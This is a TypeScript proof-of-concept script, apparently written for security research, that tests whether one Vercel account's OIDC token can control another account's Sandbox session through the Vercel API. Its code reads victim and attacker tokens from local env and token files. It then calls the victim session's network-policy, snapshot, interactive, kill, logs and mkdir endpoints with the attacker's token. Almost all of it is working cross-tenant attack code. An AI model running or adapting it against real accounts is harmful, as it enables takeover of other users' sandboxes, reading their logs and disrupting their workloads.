import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const ATTACKER = loadEnv("/tmp/vercel-sandbox/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
const A = JSON.parse(Buffer.from(ATTACKER.split(".")[1], "base64url").toString());

// obtengo el token fresco de la víctima ya mintido por el SDK
const FRESH_V = JSON.parse(readFileSync("/home/edwar/.local/share/com.vercel.token/prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A.json", "utf8")).token;

async function call(label: string, token: string, method: string, path: string, query: Record<string, string> = {}, body?: any) {
  const url = new URL("https://vercel.com/api" + path);
  for (const [k, v] of Object.entries(query)) if (v) url.searchParams.set(k, v);
  const r = await fetch(url, {
    method,
    headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  const text = await r.text();
  console.log(`\n[${r.status}] ${label}\n  ${method} ${url.pathname}?${url.searchParams}`);
  console.log("  " + (text.length > 500 ? text.slice(0, 500) + "…" : text));
}

async function main() {
  // crear sandbox víctima con SDK para tener sessionId válido
  const { Sandbox } = await import("@vercel/sandbox");
  const victim = await Sandbox.create({
    token: VICTIM, teamId: V.owner_id, projectId: V.project_id,
    resources: { vcpus: 1 }, name: "victim-np", timeout: 5 * 60_000,
  });
  const vsid = (victim as any).session?.sessionId;
  console.log("VÍCTIMA session:", vsid);

  const validBody = { allow: ["example.com"], subnets: { allow: ["0.0.0.0/0"], deny: [] } };

  await call("A: network-policy víctima (body válido, teamId=A)", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/network-policy`, { teamId: A.owner_id }, validBody);
  await call("A: network-policy víctima (body válido, teamId=V)", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/network-policy`, { teamId: V.owner_id }, validBody);
  await call("CTRL V: network-policy víctima su propia", FRESH_V, "POST", `/v2/sandboxes/sessions/${vsid}/network-policy`, { teamId: V.owner_id }, validBody);

  await call("A: extend-timeout víctima", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/extend-timeout`, { teamId: A.owner_id }, { duration: 3600 });
  await call("A: snapshot víctima", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/snapshot`, { teamId: A.owner_id });
  await call("A: interactive víctima", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/interactive`, { teamId: A.owner_id }, {});
  await call("A: kill cmd 0 víctima", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/cmd/0/kill`, { teamId: A.owner_id }, { signal: "SIGKILL" });
  await call("A: logs cmd 0 víctima", ATTACKER, "GET", `/v2/sandboxes/sessions/${vsid}/cmd/0/logs`, { teamId: A.owner_id });
  await call("A: fs/mkdir víctima", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/fs/mkdir`, { teamId: A.owner_id }, { path: "/pwn" });

  console.log("\nDONE");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });